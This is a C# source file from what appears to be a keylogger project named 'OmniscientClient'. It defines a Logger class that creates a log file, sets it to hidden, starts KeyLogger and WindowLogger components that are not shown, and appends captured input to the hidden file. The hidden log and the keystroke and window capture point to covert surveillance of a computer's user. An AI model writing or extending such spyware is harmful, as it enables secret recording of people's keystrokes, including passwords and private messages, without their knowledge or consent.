namespace OmniscientClient
{
    class Logger
    {
        private static string path = "";

        public Logger(string logPath)
        {
            path = logPath;
            if (!File.Exists(logPath))
            {
                File.Create(logPath);
            }
            File.SetAttributes(logPath, FileAttributes.Hidden);
        }

        public void Start()
        {
            KeyLogger keyLogger = new KeyLogger();
            WindowLogger windowLogger = new WindowLogger();
        }

        public static void Writer(string input, bool writeLine)
        {
            using (FileStream fileStream = new FileStream(path, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
            {
                using (StreamWriter log = new StreamWriter(fileStream))
                {
                    if (writeLine) {
                        log.WriteLine($"\n{input}");
                    } 
                    else 
                    {
                        log.Write(input);
                    }
                }
            }
        }
    }
}